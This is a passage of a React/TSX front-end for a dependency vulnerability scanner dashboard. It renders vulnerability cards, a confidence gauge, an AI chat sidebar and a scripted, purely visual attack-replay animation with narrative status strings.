                                              className="font-mono text-sm font-semibold text-gray-200 hover:text-cyan-400 hover:underline cursor-pointer transition-colors"
                                              title="Click to view AI Security Intelligence"
                                            >
                                              {vuln.id}
                                            </span>
                                            {vuln.aliases && vuln.aliases !== "No CVE ID" && (
                                              <span
                                                onClick={() => handleOpenExplainModal({ id: vuln.id, packageName: pkgName, severity: vuln.severity, description: vuln.description, aliases: vuln.aliases })}
                                                className="font-mono text-xs text-gray-400 bg-black/50 border border-white/10 px-2 py-1 rounded-md hover:text-cyan-400 hover:border-cyan-500/30 cursor-pointer transition-colors"
                                                title="Click to view AI Security Intelligence"
                                              >
                                                {vuln.aliases}
                                              </span>
                                            )}

                                            <div className="ml-auto flex gap-2">
                                              <button
                                                onClick={(e) => {
                                                  e.stopPropagation();
                                                  handleOpenExplainModal({ id: vuln.id, packageName: pkgName, severity: vuln.severity, description: vuln.description, aliases: vuln.aliases });
                                                }}
                                                className="text-xs font-semibold text-cyan-400 hover:text-cyan-300 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 px-3 py-1 rounded-full transition-colors flex items-center gap-1.5 shadow-[0_0_10px_rgba(34,211,238,0.1)]"
                                              >
                                                <Bot className="w-3.5 h-3.5" />
                                                AI Intelligence
                                              </button>
                                              <button
                                                onClick={(e) => {
                                                  e.stopPropagation();
                                                  setChatInput(`Explain this vulnerability simply: ${vuln.id} in ${pkgName}`);
                                                }}
                                                className="text-xs font-medium text-blue-400 hover:text-blue-300 bg-blue-500/10 hover:bg-blue-500/20 border border-blue-500/30 px-3 py-1 rounded-full transition-colors flex items-center gap-1.5"
                                              >
                                                <BrainCircuit className="w-3 h-3" />
                                                Explain Simply
                                              </button>
                                            </div>
                                          </div>
                                          <p className="text-gray-300 text-sm leading-relaxed">{vuln.description}</p>
                                        </div>
                                      ))}
                                    </div>
                                  </motion.div>
                                )}
                              </AnimatePresence>
                            </motion.div>
                          );
                        })}
                      </motion.div>
                    )}
                  </div>

                  {/* ========================================================= */}
                  {/* APPENDED EXTENSION WIDGETS - DO NOT MODIFY CORE ABOVE     */}
                  {/* ========================================================= */}
                  <div className="space-y-6 pt-4 border-t border-white/5 mt-8">
                    <h3 className="text-sm font-bold text-gray-500 uppercase tracking-widest px-2">Intelligence Extensions</h3>

                    {/* Extended Row 1: Security Confidence & Patch Priority */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">

                      {/* Security Confidence Gauge */}
                      <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="glass-card rounded-2xl border border-cyan-500/30 p-6 bg-gradient-to-br from-cyan-500/5 to-transparent relative overflow-hidden flex flex-col justify-center items-center group">
                        <div className="absolute top-0 left-0 w-1 h-full bg-cyan-500"></div>
                        <div className="flex items-center gap-2 mb-6 self-start w-full">
                          <Activity className="w-5 h-5 text-cyan-400" />
                          <h3 className="text-lg font-bold text-white">Security Confidence</h3>
                        </div>

                        <div className="relative w-32 h-32 flex items-center justify-center">
                          {/* Outer glow rings */}
                          <div className={`absolute inset-0 rounded-full border-4 border-dashed border-cyan-500/20 animate-[spin_20s_linear_infinite]`}></div>
                          <div className={`absolute inset-2 rounded-full border border-cyan-500/40 animate-[spin_10s_linear_infinite_reverse]`}></div>

                          {/* Radial indicator */}
                          <svg className="w-full h-full -rotate-90 transform" viewBox="0 0 100 100">
                            <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="6" />
                            <circle cx="50" cy="50" r="45" fill="none" stroke="currentColor" strokeWidth="6"
                              strokeDasharray="283" strokeDashoffset={283 - (283 * (stats.total === 0 ? 100 : Math.max(10, 100 - (stats.total * 5)))) / 100}
                              className={`transition-all duration-1000 ease-out ${stats.total === 0 ? 'text-green-500' : stats.total > 10 ? 'text-red-500' : 'text-yellow-500'}`} />
                          </svg>

                          <div className="absolute inset-0 flex flex-col items-center justify-center">
                            <span className="text-3xl font-bold font-mono text-white tracking-tighter">
                              {stats.total === 0 ? 100 : Math.max(10, 100 - (stats.total * 5))}%
                            </span>
                          </div>
                        </div>

                        <div className={`mt-6 px-4 py-1.5 rounded-full border backdrop-blur-md text-sm font-bold tracking-widest uppercase ${stats.total === 0 ? 'bg-green-500/10 border-green-500/30 text-green-400' : stats.total > 10 ? 'bg-red-500/10 border-red-500/30 text-red-400' : 'bg-yellow-500/10 border-yellow-500/30 text-yellow-400'}`}>
                          {stats.total === 0 ? 'Secure' : stats.total > 10 ? 'Critical Exposure' : 'Moderate Risk'}
                        </div>
                      </motion.div>

                      {/* AI Patch Priority Engine */}
                      {scanResult.patch_priority ? (
                        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="glass-card rounded-2xl border border-orange-500/30 p-6 bg-gradient-to-br from-orange-500/5 to-transparent relative overflow-hidden flex flex-col">
                          <div className="absolute top-0 left-0 w-1 h-full bg-orange-500"></div>
                          <div className="flex items-center gap-3 mb-5">
                            <div className="w-8 h-8 rounded-lg bg-orange-500/20 flex items-center justify-center border border-orange-500/30">
                              <Target className="w-4 h-4 text-orange-400" />
                            </div>
                            <h3 className="text-lg font-bold text-white">AI Patch Prioritization</h3>
                          </div>
                          <div className="space-y-4 flex-1 flex flex-col justify-center">
                            <div className="bg-black/40 border border-white/5 rounded-xl p-3 flex justify-between items-center group hover:bg-white/5 transition-colors">
                              <span className="text-gray-400 text-xs font-bold uppercase tracking-wider">Highest Priority</span>
                              <span className="font-mono text-orange-400 font-bold bg-orange-500/10 px-2 py-0.5 rounded border border-orange-500/20">{scanResult.patch_priority.highest_priority_package}</span>
                            </div>
                            <div className="bg-black/40 border border-white/5 rounded-xl p-3 flex justify-between items-center group hover:bg-white/5 transition-colors">
                              <span className="text-gray-400 text-xs font-bold uppercase tracking-wider">Top Exploit</span>
                              <span className="font-medium text-gray-200 text-sm max-w-[150px] truncate">{scanResult.patch_priority.most_dangerous_exploit}</span>
                            </div>
                            <div className="bg-black/40 border border-white/5 rounded-xl p-3 flex flex-col gap-2 group hover:bg-white/5 transition-colors">
                              <span className="text-gray-400 text-xs font-bold uppercase tracking-wider">Fastest Path</span>
                              <code className="text-green-400 text-xs font-mono">{scanResult.patch_priority.fastest_remediation_path}</code>
                            </div>
                          </div>
                        </motion.div>
                      ) : (
                        <div className="glass-card rounded-2xl border border-white/5 p-6 flex flex-col items-center justify-center text-gray-500 italic">No patch priority data available.</div>
                      )}
                    </div>

                    {/* Extended Row 2: Attack Intelligence Graph */}
                    {scanResult.progression_timeline && (
                      <div className="glass-card rounded-2xl border border-white/5 p-6 md:p-8 relative overflow-hidden shadow-2xl group hover:border-white/10 transition-colors">
                        <div className="absolute inset-0 bg-[url('/grid.svg')] bg-center opacity-[0.03]" style={{ backgroundSize: '30px 30px' }} />

                        <div className="flex items-center justify-between mb-8 relative z-10">
                          <div className="flex items-center gap-3">
                            <div className="w-10 h-10 rounded-xl bg-indigo-500/20 flex items-center justify-center border border-indigo-500/30 shadow-[0_0_20px_rgba(99,102,241,0.2)]">
                              <Network className="w-5 h-5 text-indigo-400" />
                            </div>
                            <h3 className="text-xl font-bold text-white tracking-tight">Attack Intelligence Graph</h3>
                          </div>
                        </div>

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 relative z-10">
                          {/* Left: Progression Timeline */}
                          <div>
                            <h4 className="text-xs font-bold uppercase tracking-widest text-gray-500 mb-6 flex items-center gap-2"><Layers className="w-4 h-4" /> Incident Progression</h4>
                            <div className="space-y-6 relative before:absolute before:inset-y-2 before:left-[9px] before:w-[2px] before:bg-indigo-900/30">
                              {scanResult.progression_timeline.map((step, idx) => (
                                <motion.div initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: 0.5 + (idx * 0.1) }} key={idx} className="relative pl-8">
                                  <div className="absolute left-0 top-1 w-5 h-5 -ml-1 rounded-full bg-black border-2 border-indigo-500 flex items-center justify-center shadow-[0_0_10px_rgba(99,102,241,0.5)]">
                                    <div className="w-1.5 h-1.5 bg-indigo-400 rounded-full animate-pulse" />
                                  </div>
                                  <span className={`text-sm font-medium ${idx === scanResult.progression_timeline!.length - 1 ? 'text-red-400 font-bold' : 'text-gray-300'}`}>{step}</span>
                                </motion.div>
                              ))}
                            </div>
                          </div>

                          {/* Right: SVG Graph Visualization */}
                          <div className="bg-black/40 rounded-xl border border-white/5 p-6 flex items-center justify-center relative overflow-hidden min-h-[200px] shadow-inner">
                            <div className="absolute inset-0 bg-indigo-500/5 animate-pulse" />

                            {/* Lightweight SVG Cyberpunk Graph */}
                            <svg className="w-full h-full max-h-[250px] overflow-visible" viewBox="0 0 300 150">
                              <defs>
                                <linearGradient id="lineGrad" x1="0%" y1="0%" x2="100%" y2="0%">
                                  <stop offset="0%" stopColor="#3b82f6" stopOpacity="0.8" />
                                  <stop offset="50%" stopColor="#8b5cf6" stopOpacity="0.8" />
                                  <stop offset="100%" stopColor="#ef4444" stopOpacity="0.8" />
                                </linearGradient>
                                <filter id="glow">
                                  <feGaussianBlur stdDeviation="3" result="coloredBlur" />
                                  <feMerge>
                                    <feMergeNode in="coloredBlur" />
                                    <feMergeNode in="SourceGraphic" />
                                  </feMerge>
                                </filter>
                              </defs>

                              {/* Lines */}
                              <path d="M 50 75 L 150 40 L 250 75" fill="none" stroke="url(#lineGrad)" strokeWidth="2" strokeDasharray="4 4" className="animate-[dash_20s_linear_infinite]" />
                              <path d="M 50 75 L 150 110 L 250 75" fill="none" stroke="url(#lineGrad)" strokeWidth="2" strokeDasharray="4 4" className="animate-[dash_20s_linear_infinite]" />

                              {/* Animated Particles along paths */}
                              <circle r="3" fill="#60a5fa" filter="url(#glow)">
                                <animateMotion dur="3s" repeatCount="indefinite" path="M 50 75 L 150 40 L 250 75" />
                              </circle>
                              <circle r="3" fill="#f87171" filter="url(#glow)">
                                <animateMotion dur="3s" repeatCount="indefinite" path="M 50 75 L 150 110 L 250 75" />
                              </circle>

                              {/* Nodes */}
                              <g transform="translate(50, 75)">
                                <circle r="15" fill="#1e3a8a" stroke="#3b82f6" strokeWidth="2" filter="url(#glow)" />
                                <circle r="5" fill="#60a5fa" className="animate-ping" />
                                <text y="25" fontSize="10" fill="#9ca3af" textAnchor="middle" className="font-mono">Package</text>
                              </g>

                              <g transform="translate(150, 40)">
                                <circle r="12" fill="#4c1d95" stroke="#8b5cf6" strokeWidth="2" filter="url(#glow)" />
                                <text y="22" fontSize="9" fill="#9ca3af" textAnchor="middle" className="font-mono">Exploit Path</text>
                              </g>

                              <g transform="translate(150, 110)">
                                <circle r="12" fill="#4c1d95" stroke="#8b5cf6" strokeWidth="2" filter="url(#glow)" />
                                <text y="22" fontSize="9" fill="#9ca3af" textAnchor="middle" className="font-mono">Exposure</text>
                              </g>

                              <g transform="translate(250, 75)">
                                <circle r="18" fill="#7f1d1d" stroke="#ef4444" strokeWidth="2" filter="url(#glow)" />
                                <circle r="8" fill="#f87171" className="animate-pulse" />
                                <text y="28" fontSize="10" fill="#fca5a5" textAnchor="middle" className="font-mono font-bold">Breach</text>
                              </g>
                            </svg>

                            <style dangerouslySetInnerHTML={{
                              __html: `
                              @keyframes dash {
                                to { stroke-dashoffset: -100; }
                              }
                            `}} />
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </div>

                {/* RIGHT COLUMN: AI Security Terminal (Sticky Sidebar) */}
                <div className="lg:col-span-4 sticky top-[104px] h-[calc(100vh-140px)] w-full">
                  <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="glass-card rounded-2xl border border-purple-500/30 flex flex-col bg-[#050505] shadow-[0_0_40px_rgba(168,85,247,0.1)] relative overflow-hidden h-full">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 via-purple-500 to-pink-500"></div>

                    <div className="p-4 border-b border-white/5 bg-white/[0.02] flex items-center justify-between shrink-0">
                      <div className="flex items-center gap-2">
                        <Bot className="w-5 h-5 text-purple-400" />
                        <h3 className="font-bold tracking-wide">AI Terminal</h3>
                      </div>
                      <span className="text-[10px] uppercase font-bold tracking-widest text-purple-400/50 px-2 py-1 bg-purple-500/10 rounded-md border border-purple-500/20">Active</span>
                    </div>

                    <div className="flex-1 overflow-y-auto p-5 space-y-5 custom-scrollbar bg-[url('/grid.svg')] bg-center" style={{ backgroundSize: '20px 20px' }}>
                      <div className="bg-purple-500/10 border border-purple-500/20 rounded-xl rounded-tl-sm p-4 w-fit max-w-[90%] backdrop-blur-sm shadow-md">
                        <p className="text-sm text-purple-100 font-light leading-relaxed">
                          I am CipherKavach, orchestrated by CascadeFlow. I've analyzed your dependencies and found {stats.total} (vulnerabilities || []). How can I assist you with remediation today?
                        </p>
                      </div>

                      {chatMessages.map((msg, i) => (
                        <div key={i} className={`flex ${msg.role === 'user' ? 'justify-end' : 'justify-start'}`}>
                          <div className={`rounded-xl p-4 w-fit max-w-[90%] text-sm font-light leading-relaxed backdrop-blur-sm shadow-md ${msg.role === 'user'
                            ? 'bg-blue-600/20 border border-blue-500/30 rounded-tr-sm text-blue-50'
                            : 'bg-purple-500/10 border border-purple-500/20 rounded-tl-sm text-purple-50'
                            }`}>
                            <div className="flex items-center gap-2 mb-2 opacity-50 text-xs font-bold uppercase tracking-widest">
                              {msg.role === 'user' ? <User className="w-3 h-3" /> : <Bot className="w-3 h-3" />}
                              {msg.role}
                            </div>
                            <div>{renderFormattedText(msg.content)}</div>
                          </div>
                        </div>
                      ))}

                      {isChatting && (
                        <div className="flex justify-start">
                          <div className="bg-purple-500/10 border border-purple-500/20 rounded-xl rounded-tl-sm p-4 flex items-center gap-3 w-fit">
                            <div className="flex gap-1">
                              <div className="w-1.5 h-1.5 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
                              <div className="w-1.5 h-1.5 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
                              <div className="w-1.5 h-1.5 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
                            </div>
                            <span className="text-xs font-mono text-purple-400/70">CipherKavach is analyzing...</span>
                          </div>
                        </div>
                      )}
                      <div ref={chatEndRef} />
                    </div>

                    {chatMessages.length === 0 && (
                      <div className="px-4 pb-3 flex flex-wrap gap-2 shrink-0">
                        {["What should I patch first?", "Explain Prototype Pollution."].map(p => (
                          <button key={p} onClick={() => insertSuggestedPrompt(p)} className="text-xs border border-white/10 bg-white/5 hover:bg-white/10 text-gray-300 px-3 py-2 rounded-lg transition-colors whitespace-nowrap">
                            {p}
                          </button>
                        ))}
                      </div>
                    )}

                    <div className="p-4 border-t border-white/5 bg-black/40 shrink-0">
                      <form onSubmit={handleChatSubmit} className="relative">
                        <input
                          type="text"
                          value={chatInput}
                          onChange={(e) => setChatInput(e.target.value)}
                          placeholder="Ask about these (vulnerabilities || [])..."
                          className="w-full bg-black/50 border border-white/10 rounded-xl py-3 pl-4 pr-12 text-sm focus:outline-none focus:border-purple-500/50 focus:ring-1 focus:ring-purple-500/50 transition-all placeholder:text-gray-600"
                          disabled={isChatting}
                        />
                        <button
                          type="submit"
                          disabled={!chatInput.trim() || isChatting}
                          className="absolute right-2 top-1/2 -translate-y-1/2 w-8 h-8 flex items-center justify-center bg-purple-600 hover:bg-purple-500 disabled:bg-gray-800 disabled:text-gray-500 text-white rounded-lg transition-colors shadow-md"
                        >
                          <Send className="w-4 h-4 ml-0.5" />
                        </button>
                      </form>
                    </div>
                  </motion.div>
                </div>

              </div>
            </div>
          </motion.div>
        )}
      </main>

      {/* CYBER ATTACK REPLAY MODE MODAL */}
      <AnimatePresence>
        {showReplayModal && (
          <div className="fixed inset-0 z-[100] bg-black/90 backdrop-blur-md flex items-center justify-center p-4">
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 20 }}
              className="glass-card max-w-5xl w-full rounded-3xl border border-white/10 overflow-hidden shadow-[0_24px_80px_rgba(0,0,0,0.9)] relative flex flex-col md:flex-row h-[82vh] font-mono text-xs"
            >
              {/* Attack Flow Particle Background */}
              <div className="absolute inset-0 pointer-events-none opacity-[0.03] bg-[radial-gradient(#f43f5e_1px,transparent_1px)] [background-size:16px_16px] animate-[pulse_4s_infinite]" />

              {/* Header Close button */}
              <button
                onClick={() => {
                  setShowReplayModal(false);
                  setReplayIsPlaying(false);
                }}
                className="absolute top-4 right-4 z-50 w-8 h-8 flex items-center justify-center rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 text-gray-400 hover:text-white transition-all shadow-lg"
              >
                <X className="w-4 h-4" />
              </button>

              {/* Left Column: Timeline Control Panel */}
              <div className="w-full md:w-3/5 p-6 md:p-8 flex flex-col justify-between border-r border-white/5 bg-[#0b0c10]/50 overflow-y-auto relative z-10">
                <div className="space-y-6">
                  {/* Title Header */}
                  <div className="flex items-center justify-between border-b border-white/5 pb-4">
                    <div className="flex items-center gap-3">
                      <div className="relative">
                        <span className={`flex h-3.5 w-3.5 rounded-full ${replayCurrentStage === 5 ? "bg-green-500 shadow-[0_0_12px_rgba(74,222,128,0.8)]" : "bg-red-500 shadow-[0_0_12px_rgba(239,68,68,0.8)]"} animate-pulse`} />
                        <span className={`animate-ping absolute inline-flex h-full w-full rounded-full ${replayCurrentStage === 5 ? "bg-green-400" : "bg-red-400"} opacity-75 top-0 left-0`} />
                      </div>
                      <div>
                        <h3 className="text-sm font-black uppercase tracking-widest text-white font-mono flex items-center gap-2">
                          Cyber Attack Replay Console
                          <span className="text-xs bg-red-500/10 text-red-400 border border-red-500/20 px-2 py-0.5 rounded-full font-bold">LIVE ESCALATION</span>
                        </h3>
                        <p className="text-xs text-gray-300 mt-1 font-semibold">Automated Exploit Sequence Validation Engine</p>
                      </div>
                    </div>
                  </div>

                  {/* Compromise Meter & Replay Progress Bar */}
                  <div className="glass-card p-4 rounded-2xl border border-white/5 space-y-3 bg-white/[0.01]">
                    <div className="flex items-center justify-between text-xs">
                      <span className="text-gray-300 uppercase tracking-wider font-bold">COMPROMISE STAGE METER</span>
                      <span className={`font-bold ${replayCurrentStage === 5 ? "text-green-400" : replayCurrentStage >= 3 ? "text-red-400" : "text-yellow-400"
                        }`}>
                        {replayCurrentStage === 5 ? "0% (SECURED)" : `${[5, 20, 55, 80, 95][replayCurrentStage]}% EXPOSED`}
                      </span>
                    </div>

                    {/* Glowing Progress Segment Bar */}
                    <div className="flex gap-1 h-3">
                      {Array.from({ length: 6 }).map((_, i) => {
                        const isFilled = i <= replayCurrentStage;
                        const isFinalSecure = replayCurrentStage === 5;

                        let segmentColor = "bg-white/5";
                        let segmentGlow = "";

                        if (isFilled) {
                          if (isFinalSecure) {
                            segmentColor = "bg-green-500";
                            segmentGlow = "shadow-[0_0_8px_rgba(74,222,128,0.6)]";
                          } else if (i >= 3) {
                            segmentColor = "bg-red-500";
                            segmentGlow = "shadow-[0_0_8px_rgba(239,68,68,0.6)]";
                          } else {
                            segmentColor = "bg-yellow-500";
                            segmentGlow = "shadow-[0_0_8px_rgba(250,204,21,0.6)]";
                          }
                        }

                        return (
                          <div
                            key={i}
                            className={`flex-1 rounded-sm transition-all duration-500 ${segmentColor} ${segmentGlow}`}
                          />
                        );
                      })}
                    </div>

                    <p className="text-xs text-gray-300 leading-relaxed mt-2 font-medium">
                      STATUS: {
                        replayCurrentStage === 5
                          ? "✓ All attack paths neutralized. CascadeFlow isolation sandbox fully verified."
                          : `⚠ Level ${replayCurrentStage + 1} elevation: ${[
                            "Initial exploit vectors detected in dependency tree.",
                            "Post-exploit payload string pushed to sandboxed target environment.",
                            "Local system permission boundary escalation in progress.",
                            "Reading transient runtime credentials maps from isolated context.",
                            "Warning: Egress exfiltration socket handshake established.",
                          ][replayCurrentStage]}`
                      }
                    </p>
                  </div>

                  {/* Business Impact & Dependency Impact Panel */}
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {/* Dependency Impact / Severity Escalation */}
                    <div className="glass-card p-4 rounded-2xl border border-white/5 bg-red-950/5 space-y-2">
                      <p className="text-xs text-gray-400 uppercase tracking-widest font-black">DEPENDENCY IMPACT EXPLANATION</p>
                      <p className="text-sm text-red-300 font-bold font-mono">
                        {REPLAY_STAGES[replayCurrentStage].impact}
                      </p>
                    </div>

                    {/* Financial/Business Impact Card */}
                    <div className="glass-card p-4 rounded-2xl border border-white/5 bg-yellow-950/5 space-y-2">
                      <p className="text-xs text-gray-400 uppercase tracking-widest font-black">ESTIMATED BUSINESS IMPACT</p>
                      <p className="text-sm text-yellow-300 font-bold font-mono">
                        {REPLAY_STAGES[replayCurrentStage].businessImpact}
                      </p>
                    </div>
                  </div>

                  {/* Enhanced Timeline Stages list */}
                  <div className="relative pl-6 space-y-4">
                    {/* Vertical Timeline line background */}
                    <div className="absolute left-2 top-2 bottom-2 w-0.5 bg-white/5 z-0" />

                    {/* Glowing active path overlay */}
                    <div
                      className="absolute left-2 top-2 w-0.5 bg-gradient-to-b from-yellow-500 via-red-500 to-green-500 transition-all duration-500 z-0 shadow-[0_0_8px_rgba(239,68,68,0.4)]"
                      style={{ height: `${(replayCurrentStage / 5) * 92}%` }}
                    />

                    {REPLAY_STAGES.map((stage, idx) => {
                      const isActive = idx === replayCurrentStage;
                      const isCompleted = idx < replayCurrentStage;
                      const isPending = idx > replayCurrentStage;

                      let nodeColor = "border-white/10 bg-[#0f1219] text-gray-600";
                      let textColor = "text-gray-600";
                      let cardBorder = "border-white/5 bg-white/[0.01]";
                      let badge = "bg-white/5 text-gray-500 border-white/5";
                      let glowBorder = "";

                      const timestamps = ["+0.00s", "+1.24s", "+2.50s", "+3.90s", "+5.15s", "+6.40s"];

                      if (isActive) {
                        nodeColor = stage.severity === "SECURED"
                          ? "border-green-500 bg-green-950 text-green-400 ring-4 ring-green-500/10 shadow-[0_0_12px_rgba(74,222,128,0.6)]"
                          : "border-red-500 bg-red-950 text-red-400 ring-4 ring-red-500/10 shadow-[0_0_12px_rgba(239,68,68,0.6)] animate-pulse";
                        textColor = "text-white";
                        cardBorder = stage.severity === "SECURED" ? "border-green-500/40 bg-green-500/[0.03]" : "border-red-500/40 bg-red-500/[0.03]";
                        badge = stage.severity === "SECURED"
                          ? "bg-green-500/20 text-green-400 border-green-500/30 font-bold"
                          : "bg-red-500/20 text-red-400 border-red-500/30 font-bold animate-pulse";
                        glowBorder = stage.severity === "SECURED" ? "shadow-[0_0_15px_rgba(74,222,128,0.1)]" : "shadow-[0_0_15px_rgba(239,68,68,0.15)]";
                      } else if (isCompleted) {
                        nodeColor = "border-yellow-500 bg-yellow-950/20 text-yellow-400 shadow-[0_0_8px_rgba(250,204,21,0.3)]";
                        textColor = "text-gray-400";
                        cardBorder = "border-yellow-500/15 bg-yellow-500/[0.01]";
                        badge = "bg-yellow-500/10 text-yellow-400 border-yellow-500/20";
                      }

                      return (
                        <div key={stage.title} className="relative z-10">
                          {/* Node Icon */}
                          <div className={`absolute -left-[23px] top-1.5 w-4 h-4 rounded-full border-2 flex items-center justify-center text-xs font-bold transition-all duration-300 ${nodeColor}`}>
                            {isCompleted ? "✓" : idx + 1}
                          </div>

                          {/* Card */}
                          <div className={`p-4 rounded-2xl border transition-all duration-300 ${cardBorder} ${glowBorder} space-y-2`}>
                            <div className="flex items-center justify-between gap-2">
                              <div className="flex items-center gap-2">
                                <span className="text-xs text-gray-300 font-mono">{timestamps[idx]}</span>
                                <h4 className={`text-xs font-black uppercase tracking-wider ${textColor}`}>{stage.title}</h4>
                              </div>
                              <span className={`text-xs font-black px-2.5 py-0.5 rounded-full border uppercase tracking-wider ${badge}`}>
                                {isActive ? "ACTIVE" : isCompleted ? "COMPLETED" : "PENDING"}
                              </span>
                            </div>
                            {isActive && (
                              <motion.p
                                initial={{ opacity: 0, y: -4 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="text-sm text-gray-200 font-mono leading-relaxed"
                              >
                                {stage.desc}
                              </motion.p>
                            )}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                </div>

                {/* AI-Generated Attack Narration Panel */}
                <div className="glass-card p-4 rounded-2xl border border-purple-500/20 bg-purple-500/[0.02] space-y-2">
                  <div className="flex items-center gap-2">
                    <BrainCircuit className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
                    <span className="text-xs text-purple-300 font-black uppercase tracking-widest font-mono">
                      AI NARRATION FEED (CONCISE & ANALYST-GRADE)
                    </span>
                  </div>
                  <p className="text-sm text-white font-mono leading-relaxed italic">
                    "{REPLAY_STAGES[replayCurrentStage].narration}"
                  </p>
                </div>

                {/* Replay Timeline Controls & Live Event Feed Ticker */}
                <div className="space-y-4 mt-6">
                  {/* Real-time Ticker Feed */}
                  <div className="glass-card p-3 rounded-xl border border-white/5 bg-black/20 flex items-center justify-between text-xs text-gray-300">
                    <div className="flex items-center gap-2">
                      <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-ping shrink-0" />
                      <span className="font-mono text-cyan-400 uppercase tracking-widest font-black">LOG TICKER:</span>
                      <span className="text-gray-200 truncate max-w-[280px]">
                        {[
                          "OZONE-SANDBOX execution spawned node tty1",
                          "Prototype Pollution payload queued targeting Object.prototype...",
                          "Elevating local session binary: chmod +x elevation",
                          "Transmitting variables dump to transient memory...",
                          "Establishing exfiltration outbound socket: port 8443",
                          "✓ Defused. Virtual patch issued. Container sandbox locked.",
                        ][replayCurrentStage]}
                      </span>
                    </div>
                    <span className="text-gray-400 font-bold shrink-0 hidden sm:inline">TTY: ACTIVE</span>
                  </div>

                  <div className="pt-4 border-t border-white/5 flex flex-wrap items-center justify-between gap-4">
                    {/* Left: Auto Play Status */}
                    <div className="flex items-center gap-2">
                      <span className={`w-2 h-2 rounded-full ${replayIsPlaying ? "bg-green-400 animate-pulse shadow-[0_0_6px_rgba(74,222,128,0.8)]" : "bg-gray-600"}`} />
                      <span className="text-xs text-gray-300 uppercase tracking-widest font-black">
                        {replayIsPlaying ? "SIMULATION ACTIVE" : "SIMULATION PAUSED"}
                      </span>
                    </div>

                    {/* Center: Controls Buttons */}
                    <div className="flex items-center gap-2">
                      {/* Restart */}
                      <button
                        onClick={() => {
                          if (isExhausted) {
                            setShowExhaustionModal(true);
                            return;
                          }
                          setReplayCurrentStage(0);
                          setReplayIsPlaying(true);
                        }}
                        title="Restart Simulation"
                        className="w-9 h-9 flex items-center justify-center bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 hover:text-white rounded-xl transition-colors"
                      >
                        <RotateCcw className="w-4.5 h-4.5" />
                      </button>

                      {/* Play/Pause */}
                      {replayIsPlaying ? (
                        <button
                          onClick={() => setReplayIsPlaying(false)}
                          className="w-16 py-2 flex items-center justify-center gap-1.5 bg-orange-500 hover:bg-orange-400 text-black font-black uppercase text-[10px] rounded-xl transition-all shadow-[0_0_12px_rgba(249,115,22,0.3)]"
                        >
                          <Pause className="w-3 h-3 fill-black" /> Pause
                        </button>
                      ) : (
                        <button
                          onClick={() => {
                            if (isExhausted) {
                              setShowExhaustionModal(true);
                              return;
                            }
                            // Centralized credit deduction for replay mode
                            consumeCredits("replay");
                            if (replayCurrentStage === REPLAY_STAGES.length - 1) {
                              setReplayCurrentStage(0);
                            }
                            setReplayIsPlaying(true);
                          }}
                          className="w-16 py-2 flex items-center justify-center gap-1.5 bg-green-500 hover:bg-green-400 text-black font-black uppercase text-[10px] rounded-xl transition-all shadow-[0_0_12px_rgba(74,222,128,0.3)]"
                        >
                          <Play className="w-3 h-3 fill-black" /> Play
                        </button>
                      )}

                      {/* Skip Stage */}
                      <button
                        onClick={() => {
                          if (isExhausted) {
                            setShowExhaustionModal(true);
                            return;
                          }
                          if (replayCurrentStage < REPLAY_STAGES.length - 1) {
                            setReplayCurrentStage(p => p + 1);
                          } else {
                            setReplayCurrentStage(0);
                          }
                        }}
                        className="w-9 h-9 flex items-center justify-center bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 hover:text-white rounded-xl transition-colors"
                      >
                        <SkipForward className="w-4.5 h-4.5" />
                      </button>
                    </div>
                  </div>
                </div>
              </div>

              {/* Right Column: High Fidelity Terminal Sandbox Feed / Resolution Screen */}
              <div className="w-full md:w-2/5 p-6 bg-black/60 flex flex-col justify-between overflow-hidden relative">
                {replayCurrentStage === 5 ? (
                  /* FINAL RESOLUTION SCREEN */
                  <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="flex flex-col h-full justify-between items-center text-center py-8 space-y-6 z-10"
                  >
                    <div className="space-y-4">
                      {/* Flashing / Glowing Shield Check */}
                      <div className="relative mx-auto w-16 h-16 flex items-center justify-center rounded-2xl bg-green-500/10 border border-green-500/30 shadow-[0_0_30px_rgba(74,222,128,0.2)]">
                        <CheckCircle2 className="w-8 h-8 text-green-400 animate-pulse" />
                        <span className="absolute inset-0 border border-green-400 rounded-2xl animate-ping opacity-25" />
                      </div>

                      <div className="space-y-1">
                        <h4 className="text-sm font-black uppercase text-green-400 tracking-widest animate-pulse font-mono">
                          Threat Chain Successfully Neutralized
                        </h4>
                        <p className="text-[9px] text-gray-500 font-mono uppercase tracking-wider">
                          CascadeFlow Runtime Protection active
                        </p>
                      </div>
                    </div>

                    {/* Resolution Metrics Panel */}
                    <div className="w-full glass-card p-4 rounded-2xl border border-green-500/20 bg-green-500/[0.02] text-left space-y-3">
                      <p className="text-[10px] font-bold text-white uppercase tracking-wider border-b border-white/5 pb-2">
                        🛡 REMEDIATION REPORT
                      </p>
                      <div className="space-y-1.5 font-mono text-[9px] text-gray-400">
                        <div className="flex justify-between">
                          <span>Attack Vector:</span>
